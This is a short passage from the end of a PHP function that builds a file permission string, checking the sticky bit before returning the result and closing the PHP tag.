(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
